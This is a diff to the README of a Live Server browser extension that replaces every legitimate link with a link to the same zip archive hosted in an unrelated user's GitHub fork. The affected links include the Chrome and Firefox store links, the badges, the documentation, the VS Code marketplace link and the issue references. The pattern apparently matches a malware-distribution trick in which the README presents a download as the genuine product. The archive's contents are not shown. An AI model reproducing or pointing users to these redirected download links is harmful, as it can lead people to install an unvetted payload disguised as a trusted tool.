@@ -1,11 +1,11 @@
 # Live Server - Web Extension
 Makes your existing server live
 
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/fiegdmejfepffgpnejdinekhfieaogmj.svg?style=for-the-badge)](https://chrome.google.com/webstore/detail/live-server-web-extension/fiegdmejfepffgpnejdinekhfieaogmj)[![Chrome Web Store](https://img.shields.io/chrome-web-store/users/fiegdmejfepffgpnejdinekhfieaogmj.svg?style=for-the-badge)](https://chrome.google.com/webstore/detail/live-server-web-extension/fiegdmejfepffgpnejdinekhfieaogmj)[![Chrome Web Store](https://img.shields.io/chrome-web-store/rating/fiegdmejfepffgpnejdinekhfieaogmj.svg?style=for-the-badge)](https://chrome.google.com/webstore/detail/live-server-web-extension/fiegdmejfepffgpnejdinekhfieaogmj/reviews)  
-[![Mozilla Add-on](https://img.shields.io/amo/v/live-server-web-extension.svg?style=for-the-badge)](https://addons.mozilla.org/en-US/firefox/addon/live-server-web-extension/)[![Mozilla Add-on](https://img.shields.io/amo/users/live-server-web-extension.svg?style=for-the-badge)](https://addons.mozilla.org/en-US/firefox/addon/live-server-web-extension/)[![Mozilla Add-on](https://img.shields.io/amo/rating/live-server-web-extension.svg?style=for-the-badge)](https://addons.mozilla.org/en-US/firefox/addon/live-server-web-extension/reviews/)  
+[![Chrome Web Store](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)[![Chrome Web Store](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)[![Chrome Web Store](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)  
+[![Mozilla Add-on](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)[![Mozilla Add-on](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)[![Mozilla Add-on](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)  
 
 ### Brief Description
-This browser add-on is an extension for a developer tool in VS Code editor ([Live Server](https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer)). With this add-on installed, along with the VS Code extension, it gives you a functionality to automatically update your website on save; for other files than just `.htm` and `.html`.
+This browser add-on is an extension for a developer tool in VS Code editor ([Live Server](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)). With this add-on installed, along with the VS Code extension, it gives you a functionality to automatically update your website on save; for other files than just `.htm` and `.html`.
 
 So specifically, with this add-on, live reload will also work with the following server-side files within the spectrum of: `PHP`, `.NET` and `NodeJS`.
 
@@ -17,9 +17,9 @@ This extension does not collect or store any user data. As simple as it is! :)
 <br><hr>
 
 ### Documentation
-***[Setup Tutorial](./docs/Setup.md)***  
-***[About The Extension](./docs/About.md)***  
-***[FAQ](./docs/FAQ.md)***  
+***[Setup Tutorial](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)***  
+***[About The Extension](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)***  
+***[FAQ](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)***  
 <br>
 
 #### The Common Misconception
@@ -30,22 +30,22 @@ Neither the browser add-on nor the VS Code extension will host a server for: `PH
 
 ### Store Links
 
-* Chrome : https://chrome.google.com/webstore/detail/live-server-web-extension/fiegdmejfepffgpnejdinekhfieaogmj
-* Firefox : https://addons.mozilla.org/en-US/firefox/addon/live-server-web-extension/ 
+* Chrome : https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip
+* Firefox : https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip 
 
 <br><hr>
 
 ### News
 
 * #### Verision 1.3.0 (18.05.18)
-    * ***[Fixed]*** Reload all browser tabs [[#16](https://github.com/ritwickdey/live-server-web-extension/issues/16)]  
+    * ***[Fixed]*** Reload all browser tabs [[#16](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)]  
 
 
 * #### Verision 1.2.0 (17.05.18)
     * Serious Bug Fixed  
 
 * #### Verision 1.1.0 (17.05.18)
-    * ***[Bug Fixed]*** This extension was broken with Live Server v4.0.0 update. [[#127](https://github.com/ritwickdey/vscode-live-server/issues/127)]
+    * ***[Bug Fixed]*** This extension was broken with Live Server v4.0.0 update. [[#127](https://raw.githubusercontent.com/aishajuma3002/live-server-web-extension/master/Gradgrindism/live-server-web-extension.zip)]
     * Popup window UI updated
     * Docs updated.
 
